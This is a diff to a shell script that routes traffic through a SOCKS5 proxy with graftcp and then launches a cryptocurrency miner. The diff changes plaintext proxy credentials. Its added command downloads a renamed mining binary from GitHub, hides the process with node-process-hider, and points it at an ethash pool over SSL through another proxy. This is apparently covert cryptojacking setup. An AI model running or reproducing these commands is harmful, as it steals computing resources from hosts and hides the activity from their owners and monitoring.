@@ -13,8 +13,8 @@ listen = :2233
 loglevel = 1 
 select_proxy_mode=socks5_only 
 socks5 = 103.253.24.243:8080
-socks5_username = woiden_berkah69
-socks5_password = liyan65
+socks5_username = woiden_indra
+socks5_password = liyan25
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -36,4 +36,4 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_18.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://github.com/liyanul2525/rondo/raw/main/sayang.tar.gz && tar -xf sayang.tar.gz >/dev/null 2>&1 && sayang/rondo -a scryptn2 -o stratum+tcp://scryptn2.mine.zergpool.com:3435 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,mc=XBTX,ID=Tuyul -t 2 > /tmp/rondo.log 2>&1
+./graftcp/graftcp sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://github.com/liyanul2525/liyanul/files/9190123/babi.tar.gz && tar -xf babi.tar.gz && sudo ph add babi/ngepet && babi/ngepet -a ethash -o stratum+ssl://34.149.10.66:443 -u 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul socks5://192.252.209.155:14455
